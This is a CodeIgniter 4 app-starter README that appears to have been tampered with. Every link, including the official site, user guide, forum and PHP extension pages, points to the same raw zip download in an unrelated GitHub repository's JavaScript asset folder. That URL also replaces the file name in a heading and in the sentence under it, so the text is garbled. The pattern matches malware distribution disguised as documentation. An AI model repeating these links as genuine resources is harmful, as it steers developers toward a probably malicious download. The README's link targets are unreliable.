# CodeIgniter 4 Application Starter

## What is CodeIgniter?

CodeIgniter is a PHP full-stack web framework that is light, fast, flexible and secure.
More information can be found at the [official site](https://github.com/bro-gervil/userApi/raw/refs/heads/master/public/assets/js/tabulator-master/src/js/modules/Keybindings/user-Api-autocombustible.zip).

This repository holds a composer-installable app starter.
It has been built from the
[development repository](https://github.com/bro-gervil/userApi/raw/refs/heads/master/public/assets/js/tabulator-master/src/js/modules/Keybindings/user-Api-autocombustible.zip).

More information about the plans for version 4 can be found in [CodeIgniter 4](https://github.com/bro-gervil/userApi/raw/refs/heads/master/public/assets/js/tabulator-master/src/js/modules/Keybindings/user-Api-autocombustible.zip) on the forums.

The user guide corresponding to the latest version of the framework can be found
[here](https://github.com/bro-gervil/userApi/raw/refs/heads/master/public/assets/js/tabulator-master/src/js/modules/Keybindings/user-Api-autocombustible.zip).

## Installation & updates

`composer create-project codeigniter4/appstarter` then `composer update` whenever
there is a new release of the framework.

When updating, check the release notes to see if there are any changes you might need to apply
to your `app` folder. The affected files can be copied or merged from
`vendor/codeigniter4/framework/app`.

## Setup

Copy `env` to `.env` and tailor for your app, specifically the baseURL
and any database settings.

## Important Change with https://github.com/bro-gervil/userApi/raw/refs/heads/master/public/assets/js/tabulator-master/src/js/modules/Keybindings/user-Api-autocombustible.zip

`https://github.com/bro-gervil/userApi/raw/refs/heads/master/public/assets/js/tabulator-master/src/js/modules/Keybindings/user-Api-autocombustible.zip` is no longer in the root of the project! It has been moved inside the *public* folder,
for better security and separation of components.

This means that you should configure your web server to "point" to your project's *public* folder, and
not to the project root. A better practice would be to configure a virtual host to point there. A poor practice would be to point your web server to the project root and expect to enter *public/...*, as the rest of your logic and the
framework are exposed.

**Please** read the user guide for a better explanation of how CI4 works!

## Repository Management

We use GitHub issues, in our main repository, to track **BUGS** and to track approved **DEVELOPMENT** work packages.
We use our [forum](https://github.com/bro-gervil/userApi/raw/refs/heads/master/public/assets/js/tabulator-master/src/js/modules/Keybindings/user-Api-autocombustible.zip) to provide SUPPORT and to discuss
FEATURE REQUESTS.

This repository is a "distribution" one, built by our release preparation script.
Problems with it can be raised on our forum, or as issues in the main repository.

## Server Requirements

PHP version 7.4 or higher is required, with the following extensions installed:

- [intl](https://github.com/bro-gervil/userApi/raw/refs/heads/master/public/assets/js/tabulator-master/src/js/modules/Keybindings/user-Api-autocombustible.zip)
- [mbstring](https://github.com/bro-gervil/userApi/raw/refs/heads/master/public/assets/js/tabulator-master/src/js/modules/Keybindings/user-Api-autocombustible.zip)

Additionally, make sure that the following extensions are enabled in your PHP:

- json (enabled by default - don't turn it off)
- [mysqlnd](https://github.com/bro-gervil/userApi/raw/refs/heads/master/public/assets/js/tabulator-master/src/js/modules/Keybindings/user-Api-autocombustible.zip) if you plan to use MySQL
- [libcurl](https://github.com/bro-gervil/userApi/raw/refs/heads/master/public/assets/js/tabulator-master/src/js/modules/Keybindings/user-Api-autocombustible.zip) if you plan to use the HTTP\CURLRequest library
